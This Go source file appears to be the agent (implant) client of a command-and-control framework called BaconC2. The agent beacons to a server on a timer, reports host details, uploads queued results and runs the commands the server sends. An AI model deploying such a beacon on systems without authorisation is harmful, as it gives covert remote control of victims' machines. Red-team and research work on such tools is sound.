package agent

import (
	"fmt"
	"log"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type AgentClient struct {
	config          config.AgentConfig
	transport       local_models.ITransportProtocol
	commandExecutor models.ICommandExecutor
	resultsQueue    queue.IResultQueue
	agent           models.Agent
	isRunning       bool
	stopChan        chan struct{}
}

func NewAgentClient(cfg config.AgentConfig, tr local_models.ITransportProtocol, commandExecutor models.ICommandExecutor, commandQueue queue.ICommandQueue, resultsQueue queue.IResultQueue) *AgentClient {
	return &AgentClient{
		config:          cfg,
		transport:       tr,
		commandExecutor: commandExecutor,
		resultsQueue:    resultsQueue,
		stopChan:        make(chan struct{}),
	}
}

func (c *AgentClient) Initialize() error {
	sysInfo, err := sysinfo.GatherMinimalInfo(c.config.Protocol)
	if err != nil {
		log.Printf("Failed to gather minimal system info: %v", err)
	}

	c.agent = models.Agent{
		ID:       c.config.AgentID,
		Hostname: sysInfo.Hostname,
		IP:       sysInfo.IP,
		OS:       sysInfo.OS,
		Protocol: sysInfo.Protocol,
	}

	if err := c.transport.Initialize(); err != nil {
		return err
	}

	if err := c.transport.Register(c.agent); err != nil {
		return err
	}

	return nil
}

func (c *AgentClient) Start() error {
	if c.isRunning {
		return nil
	}

	c.isRunning = true
	log.Printf("Agent %s started, beaconing every %s", c.agent.ID, c.config.BeaconInterval)
	go c.beaconLoop()

	return nil
}

func (c *AgentClient) Stop() {
	if !c.isRunning {
		return
	}

	c.isRunning = false
	close(c.stopChan)

	if err := c.transport.Close(); err != nil {
		log.Printf("Error closing transport: %v", err)
	}
}

func (c *AgentClient) beaconLoop() {
	ticker := time.NewTicker(c.config.BeaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-c.stopChan:
			return
		case <-ticker.C:
			c.beacon()
		}
	}
}

func (c *AgentClient) beacon() {
	// Gather minimal system info for every beacon
	sysInfo, err := sysinfo.GatherMinimalInfo(c.config.Protocol)
	if err != nil {
		log.Printf("Failed to gather minimal system info: %v", err)
	} else {
		result := models.CommandResult{
			ID:     fmt.Sprintf("sysinfo-%d", time.Now().UnixNano()),
			Status: "success",
			Output: fmt.Sprintf("Hostname: %s, IP: %s, OS: %s, Protocol: %s",
				sysInfo.Hostname, sysInfo.IP, sysInfo.OS, sysInfo.Protocol),
		}
		if err := c.resultsQueue.Add(result); err != nil {
			log.Printf("Failed to queue minimal system info: %v", err)
		}
	}

	// Beacon to server and check if results are requested
	cmd, requestResults, err := c.transport.BeaconWithResultRequest()
	if err != nil {
		log.Printf("Beacon error: %v", err)
		return
	}

	// Send queued results if requested
	if requestResults {
		for {
			result, ok := c.resultsQueue.Get()
			if !ok {
				break
			}
			if err := c.transport.SendResult(c.agent.ID, result); err != nil {
				log.Printf("Failed to send result for command %s: %v", result.ID, err)
				// Re-queue the result on failure
				if err := c.resultsQueue.Add(result); err != nil {
					log.Printf("Error re-queuing result %s: %v", result.ID, err)
				}
			} else {
				log.Printf("Sent result for command %s", result.ID)
			}
		}
	}

	if cmd.ID != "" && cmd.Command != "" {
		log.Printf("Received command %s: %s", cmd.ID, cmd.Command)
		// Execute the command using the executor
		result := c.commandExecutor.Execute(cmd)
		if result.Status == "error" {
			log.Printf("Command %s failed: %s", cmd.ID, result.Output)
		} else {
			log.Printf("Command %s queued result", cmd.ID)
		}
	}
}

func getOutboundIP() string {
	return "127.0.0.1" // Placeholder
}
